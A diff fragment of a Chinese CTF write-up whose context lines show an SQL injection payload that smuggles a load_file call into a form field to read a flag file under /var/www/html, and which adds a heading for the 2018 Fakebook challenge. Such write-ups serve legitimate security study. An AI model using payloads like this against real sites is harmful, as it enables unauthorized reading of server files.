@@ -138,3 +138,5 @@ https://www.sojson.com/hexadecimal.html
 title=12&category=12',content=(select(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php"))),/*&content=123
 ```
 ![](assets/Day%206/file-20251224173652831.png)
+
+# [网鼎杯 2018]Fakebook
